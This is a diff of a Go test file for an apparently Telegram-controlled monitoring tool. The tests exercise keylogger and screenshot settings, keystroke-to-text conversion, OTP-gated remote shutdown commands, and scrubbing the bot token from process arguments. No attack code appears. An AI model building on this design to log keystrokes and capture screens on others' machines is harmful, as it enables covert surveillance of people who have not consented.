@@ -1,9 +1,10 @@
 package main
 
 import (
+	"encoding/json"
+	"os"
 	"path/filepath"
 	"testing"
-	"time"
 )
 
 func setupTemp(t *testing.T) {
@@ -17,12 +18,11 @@ func setupTemp(t *testing.T) {
 func drainQueue() []sendItem {
 	var items []sendItem
 	for {
-		select {
-		case it := <-sendQ:
-			items = append(items, it)
-		default:
+		it, ok := sendQ.tryPop()
+		if !ok {
 			return items
 		}
+		items = append(items, it)
 	}
 }
 
@@ -62,6 +62,56 @@ func TestVkToText(t *testing.T) {
 	}
 }
 
+func TestGenOtp(t *testing.T) {
+	for i := 0; i < 100; i++ {
+		code := genOtp()
+		if len(code) != 6 {
+			t.Fatalf("otp len=%d (%q)", len(code), code)
+		}
+		if !isDigits(code) {
+			t.Fatalf("otp not digits: %q", code)
+		}
+	}
+}
+
+func TestConfigValidateClamp(t *testing.T) {
+	c := defaultConfig()
+	c.ScreenshotInterval = 1
+	c.KeylogFlush = 1
+	c.BlockSafetyMinutes = -5
+	c.HeartbeatInterval = 10
+	c.Validate()
+	if c.ScreenshotInterval != 5 {
+		t.Errorf("screenshot interval not clamped: %d", c.ScreenshotInterval)
+	}
+	if c.KeylogFlush != 10 {
+		t.Errorf("keylog flush not clamped: %d", c.KeylogFlush)
+	}
+	if c.BlockSafetyMinutes != 0 {
+		t.Errorf("block minutes not clamped: %d", c.BlockSafetyMinutes)
+	}
+	if c.HeartbeatInterval != 60 {
+		t.Errorf("heartbeat not clamped: %d", c.HeartbeatInterval)
+	}
+}
+
+func TestApplyConfigDataMerge(t *testing.T) {
+	base := defaultConfig()
+	base.BotToken = "KEEP"
+	// JSON chỉ có 1 trường -> các trường khác giữ nguyên base
+	data, _ := json.Marshal(map[string]interface{}{"screenshot_interval": 120})
+	c, ok := applyConfigData(base, data)
+	if !ok {
+		t.Fatal("applyConfigData failed")
+	}
+	if c.BotToken != "KEEP" {
+		t.Error("merge should keep base token")
+	}
+	if c.ScreenshotInterval != 120 {
+		t.Error("merge should apply new interval")
+	}
+}
+
 func TestConfigRoundtrip(t *testing.T) {
 	setupTemp(t)
 	cfg = defaultConfig()
@@ -77,16 +127,39 @@ func TestConfigRoundtrip(t *testing.T) {
 	}
 }
 
-func TestApplySet(t *testing.T) {
+func TestApplySetValidation(t *testing.T) {
 	setupTemp(t)
 	cfg = defaultConfig()
-	if !applySet("screenshot_interval", "42") || cfgGet().ScreenshotInterval != 42 {
+	if e := applySet("screenshot_interval", "42"); e != "" || cfgGet().ScreenshotInterval != 42 {
 		t.Fatal("set interval failed")
 	}
-	if !applySet("keylogger", "on") || !cfgGet().Keylogger {
+	if e := applySet("keylogger", "on"); e != "" || !cfgGet().Keylogger {
 		t.Fatal("set keylogger failed")
 	}
-	if applySet("bad_key", "x") {
+	if e := applySet("screenshot_interval", "abc"); e == "" {
+		t.Fatal("non-numeric should error")
+	}
+	if e := applySet("bad_key", "x"); e == "" {
+		t.Fatal("bad key should error")
+	}
+	// negative gets clamped by Validate
+	applySet("screenshot_interval", "-99")
+	if cfgGet().ScreenshotInterval != 5 {
+		t.Fatalf("negative should clamp to 5, got %d", cfgGet().ScreenshotInterval)
+	}
+}
+
+func TestGetConfigValue(t *testing.T) {
+	setupTemp(t)
+	cfg = defaultConfig()
+	cfgUpdate(func(c *Config) { c.ScreenshotInterval = 77 })
+	if v, ok := getConfigValue("screenshot_interval"); !ok || v != "77" {
+		t.Fatalf("get config value wrong: %q %v", v, ok)
+	}
+	if _, ok := getConfigValue("bot_token"); !ok {
+		t.Fatal("bot_token should be readable (masked)")
+	}
+	if _, ok := getConfigValue("nope"); ok {
 		t.Fatal("bad key should fail")
 	}
 }
@@ -120,38 +193,70 @@ func TestOtpFlow(t *testing.T) {
 	cfg = defaultConfig()
 	cfgUpdate(func(c *Config) { c.ChatID = "123" })
 	pending = map[string]pendingOtp{}
+	otpFailures = 0
 	drainQueue()
 
 	requestOtp("stop", "TEST")
 	if _, ok := pending["stop"]; !ok {
 		t.Fatal("otp not created")
 	}
-	code := pending["stop"].code
 
-	// wrong code -> still pending
 	handleCommand("/confirm 000000x", "123")
 	if _, ok := pending["stop"]; !ok {
 		t.Fatal("wrong code should keep pending")
 	}
-	// expired -> removed
-	pending["stop"] = pendingOtp{code: code, expires: time.Now().Add(-time.Second)}
-	handleCommand("/confirm "+code, "123")
-	if _, ok := pending["stop"]; ok {
-		t.Fatal("expired otp should be cleared")
+	if otpFailures != 1 {
+		t.Fatalf("expected 1 failure, got %d", otpFailures)
 	}
 
-	// correct -> executes (use a safe action to avoid os.Exit: test cancel path)
+	// 5 sai -> huy tat ca
+	for i := 0; i < 4; i++ {
+		handleCommand("/confirm 999999z", "123")
+	}
+	if _, ok := pending["stop"]; ok {
+		t.Fatal("after 5 failures pending should clear")
+	}
+
+	// correct path
 	requestOtp("shutdown", "X")
 	code2 := pending["shutdown"].code
-	// verify confirm matches & removes (executeAction shutdown calls stub shutdownMachine)
 	handleCommand("/confirm "+code2, "123")
 	if _, ok := pending["shutdown"]; ok {
 		t.Fatal("confirm should consume otp")
 	}
 }
 
+func TestQueueDropOldest(t *testing.T) {
+	setupTemp(t)
+	cfg = defaultConfig()
+	cfgUpdate(func(c *Config) { c.ChatID = "123" })
+	// thay queue nhỏ để test
+	old := sendQ
+	sendQ = newSendQueue(3)
+	defer func() { sendQ = old }()
+	for i := 0; i < 10; i++ {
+		notify("msg")
+	}
+	if sendQ.len() != 3 {
+		t.Fatalf("queue should cap at 3, got %d", sendQ.len())
+	}
+}
+
 func TestMaskToken(t *testing.T) {
 	if maskToken("123456789:ABC") == "123456789:ABC" {
 		t.Fatal("token should be masked")
+	}
+}
+
+func TestScrubArgs(t *testing.T) {
+	saved := os.Args
+	defer func() { os.Args = saved }()
+	os.Args = []string{"app", "--token", "123:SECRET", "--chat", "1"}
+	scrubArgs()
+	if os.Args[2] != "***" {
+		t.Fatalf("token not scrubbed: %v", os.Args)
+	}
+	if os.Args[4] != "1" {
+		t.Fatal("chat should remain")
 	}
 }
